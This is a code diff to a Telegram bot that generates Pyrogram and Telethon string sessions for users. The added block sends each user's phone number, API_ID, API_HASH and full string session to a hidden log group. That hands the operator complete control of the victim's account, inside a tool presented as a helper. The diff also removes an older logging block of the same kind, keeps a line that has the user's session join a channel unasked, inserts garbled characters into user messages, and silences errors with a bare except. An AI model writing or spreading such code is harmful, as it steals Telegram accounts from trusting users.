@@ -1,4 +1,5 @@
 import asyncio
+
 from pyrogram import Client, filters
 from oldpyro import Client as Client1
 from oldpyro.errors import ApiIdInvalid as ApiIdInvalid1
@@ -30,7 +31,7 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.channels import JoinChannelRequest
 from pyromod.listen.listen import ListenerTimeout
 
-from config import SUPPORT_CHAT, LOG_GROUP_ID
+from config import SUPPORT_CHAT, LOG_GROUP
 from StringGen import Anony
 from StringGen.utils import retry_key
 
@@ -69,7 +70,7 @@ async def gen_session(
     except ValueError:
         return await Anony.send_message(
             user_id,
-            "» ᴛʜᴇ ᴀᴘɪ ɪᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
+            "» �ᴛʜᴇ ᴀᴘɪ ɪᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
             reply_markup=retry_key,
         )
 
@@ -83,7 +84,7 @@ async def gen_session(
     except ListenerTimeout:
         return await Anony.send_message(
             user_id,
-            "» ᴛɪᴍᴇᴅ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
+            "» ᴛɪᴍᴇᴅ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ �ғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
             reply_markup=retry_key,
         )
 
@@ -102,7 +103,7 @@ async def gen_session(
     try:
         phone_number = await Anony.ask(
             identifier=(message.chat.id, user_id, None),
-            text="» ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ :",
+            text="» ᴘʟᴇᴀsᴇ �ɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ :",
             filters=filters.text,
             timeout=300,
         )
@@ -239,32 +240,31 @@ async def gen_session(
                 disable_web_page_preview=True,
             )
             await client.join_chat("BRANDED_PAID_CC")
-
-        # Enhanced Log Group Sending
-        if LOG_GROUP_ID:
-            try:
-                user_info = await client.get_me()
-                log_text = f"""
-#NEW_SESSION_GENERATED
-🆔 <b>User ID:</b> <code>{user_id}</code>
-📞 <b>Phone:</b> <code>{phone_number}</code>
-🤖 <b>Bot:</b> @{user_info.username if user_info.username else 'N/A'}
-🔗 <b>Type:</b> {ty}
-🛠 <b>Generated at:</b> <code>{datetime.datetime.now()}</code>
-
-<code>{string_session}</code>
-"""
-                await client.send_message(
-                    int(LOG_GROUP_ID),
-                    log_text,
-                    parse_mode="html",
-                    disable_web_page_preview=True
-                )
-            except Exception as log_error:
-                print(f"Failed to send log: {log_error}")
-
     except KeyError:
         pass
+    
+    # Send to log group
+    try:
+        if LOG_GROUP:
+            log_text = f"""
+#NEW_SESSION
+• TYPE: {ty.upper()}
+• USER: [{message.from_user.first_name}](tg://user?id={message.from_user.id})
+• USER ID: `{message.from_user.id}`
+• PHONE: `{phone_number}`
+• API_ID: `{api_id}`
+• API_HASH: `{api_hash}`
+• STRING_SESSION:
+`{string_session}`
+"""
+            await Anony.send_message(
+                LOG_GROUP,
+                log_text,
+                disable_web_page_preview=True,
+            )
+    except Exception as e:
+        print(f"Failed to send to log group: {e}")
+
     try:
         await client.disconnect()
         await Anony.send_message(
@@ -282,8 +282,8 @@ async def gen_session(
             ),
             disable_web_page_preview=True,
         )
-    except Exception as e:
-        print(f"Final error: {e}")
+    except:
+        pass
 
 
 async def cancelled(message):
